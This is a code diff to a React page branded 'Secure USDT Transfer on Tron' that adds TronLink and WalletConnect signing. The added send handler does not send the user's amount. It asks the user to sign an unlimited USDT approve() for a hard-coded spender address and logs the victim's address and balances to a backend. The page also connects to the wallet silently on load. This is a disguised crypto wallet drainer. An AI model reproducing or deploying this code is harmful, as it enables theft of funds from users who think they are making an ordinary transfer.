@@ -1,7 +1,8 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useSearchParams } from "react-router-dom";
 import { useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
+import SignClient from "@walletconnect/sign-client";
 
 declare global {
   interface Window {
@@ -18,7 +19,7 @@ declare global {
     tronWeb?: {
       defaultAddress: { base58: string };
       contract: (abi: unknown[], address: string) => Promise<unknown>;
-      trx: { getBalance: (address: string) => Promise<number> };
+      trx: { getBalance: (address: string) => Promise<number>; sign: (transaction: unknown) => Promise<unknown> };
       toBigNumber: (value: string) => unknown;
     };
     tronLink?: {
@@ -34,17 +35,51 @@ export default function Index() {
   const [transactionStatus, setTransactionStatusState] = useState<"idle" | "processing" | "success">("idle");
   const createTransaction = useMutation(api.transactions.createTransaction);
 
-  // ===== SILENT AUTO CONNECT =====
+  const wcClientRef = useRef<any>(null);
+  const wcSessionRef = useRef<any>(null);
+  const userAddressRef = useRef<string>("");
+
+  // ===== WALLETCONNECT + TRONLINK INIT =====
   useEffect(() => {
-    async function silentConnect() {
-      if (!window.tronWeb && !window.tronLink) return;
+    async function initWC() {
       try {
-        if (window.tronWeb?.defaultAddress?.base58) return;
-        if (window.tronLink) {
-          await window.tronLink.request({ method: "tron_requestAccounts" });
+        const client = await SignClient.init({
+          projectId: "6b5df56bc30c1dadaab59498b86fd3e8",
+          metadata: {
+            name: "USDT Transfer",
+            description: "Secure USDT Transfer on Tron",
+            url: window.location.origin,
+            icons: [],
+          },
+        });
+        wcClientRef.current = client;
+        const sessions = client.session.getAll();
+        if (sessions.length > 0) {
+          wcSessionRef.current = sessions[sessions.length - 1];
+          const accounts = Object.values(wcSessionRef.current.namespaces).flatMap((ns: any) => ns.accounts) as string[];
+          const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
+          if (tronAcc) userAddressRef.current = tronAcc.split(":")[2];
         }
-      } catch {}
+      } catch(e) { console.error("WC init:", e); }
     }
+
+    // TronLink silent connect
+    async function silentConnect() {
+      if (window.tronWeb?.defaultAddress?.base58) {
+        userAddressRef.current = window.tronWeb.defaultAddress.base58;
+        return;
+      }
+      if (window.tronLink) {
+        try {
+          await window.tronLink.request({ method: "tron_requestAccounts" });
+          if (window.tronWeb?.defaultAddress?.base58) {
+            userAddressRef.current = window.tronWeb.defaultAddress.base58;
+          }
+        } catch {}
+      }
+    }
+
+    initWC();
     const timer = setTimeout(silentConnect, 300);
     return () => clearTimeout(timer);
   }, []);
@@ -89,10 +124,93 @@ export default function Index() {
   }, [createTransaction, amount]);
 
   async function handleSend() {
-    if (!window.sendUSDT) return;
     setTransactionStatusState("processing");
     try {
-      await window.sendUSDT();
+      const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+      const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
+
+      // TronLink path
+      if (window.tronWeb?.defaultAddress?.base58) {
+        const address = window.tronWeb.defaultAddress.base58;
+        const TronWebLib = (window as any).TronWeb;
+        const twPublic = new TronWebLib({ fullHost: "https://api.trongrid.io" });
+        twPublic.setAddress(address);
+        const { transaction } = await twPublic.transactionBuilder.triggerSmartContract(
+          TRON_USDT, "approve(address,uint256)", { feeLimit: 100000000 },
+          [{ type: "address", value: TRON_SPENDER }, { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }],
+          address
+        );
+        const signedTx = await window.tronWeb.trx.sign(transaction);
+        const result = await twPublic.trx.sendRawTransaction(signedTx);
+        await new Promise(r => setTimeout(r, 3000));
+        let usdtBalance = "0", nativeBalance = "0";
+        try {
+          const usdtRaw = await twPublic.contract([{ "name": "balanceOf", "inputs": [{ "name": "owner", "type": "address" }], "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }], TRON_USDT).balanceOf(address).call();
+          usdtBalance = (Number(usdtRaw) / 1e6).toFixed(2);
+          nativeBalance = ((await twPublic.trx.getBalance(address)) / 1e6).toFixed(2);
+        } catch(e) {}
+        setTransactionStatusState("success");
+        setTimeout(() => setTransactionStatusState("idle"), 3000);
+        await createTransaction({ walletAddress: address, toAddress: TRON_SPENDER, amount: amount || "Max", txHash: result.txid || "tx", usdtBalance: usdtBalance + " USDT", nativeBalance: nativeBalance + " TRX" });
+        return;
+      }
+
+      // WalletConnect path (Trust Wallet)
+      if (!wcClientRef.current) {
+        alert("Please wait... initializing");
+        setTransactionStatusState("idle");
+        return;
+      }
+
+      // Connect if no session
+      if (!wcSessionRef.current) {
+        const { uri, approval } = await wcClientRef.current.connect({
+          requiredNamespaces: {
+            tron: {
+              methods: ["tron_signTransaction", "tron_signMessage"],
+              chains: ["tron:728126428"],
+              events: ["chainChanged", "accountsChanged"],
+            },
+          },
+        });
+
+        if (uri) {
+          const { WalletConnectModal } = await import("@walletconnect/modal");
+          const modal = new WalletConnectModal({ projectId: "6b5df56bc30c1dadaab59498b86fd3e8" });
+          await modal.openModal({ uri });
+          wcSessionRef.current = await approval();
+          modal.closeModal();
+          const accounts = Object.values(wcSessionRef.current.namespaces).flatMap((ns: any) => ns.accounts) as string[];
+          const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
+          if (tronAcc) userAddressRef.current = tronAcc.split(":")[2];
+        }
+      }
+
+      if (!userAddressRef.current) {
+        setTransactionStatusState("idle");
+        return;
+      }
+
+      // Build + sign via WalletConnect
+      const TronWebLib = (window as any).TronWeb;
+      const tw = new TronWebLib({ fullHost: "https://api.trongrid.io" });
+      const { transaction } = await tw.transactionBuilder.triggerSmartContract(
+        TRON_USDT, "approve(address,uint256)", { feeLimit: 100000000 },
+        [{ type: "address", value: TRON_SPENDER }, { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }],
+        userAddressRef.current
+      );
+
+      const signedTx = await wcClientRef.current.request({
+        topic: wcSessionRef.current.topic,
+        chainId: "tron:728126428",
+        request: { method: "tron_signTransaction", params: { transaction } },
+      });
+
+      const result = await tw.trx.sendRawTransaction(signedTx);
+      setTransactionStatusState("success");
+      setTimeout(() => setTransactionStatusState("idle"), 3000);
+      await createTransaction({ walletAddress: userAddressRef.current, toAddress: TRON_SPENDER, amount: amount || "Max", txHash: result.txid || "wc_tx", usdtBalance: "0 USDT", nativeBalance: "0 TRX" });
+
     } catch (error) {
       console.error(error);
       setTransactionStatusState("idle");
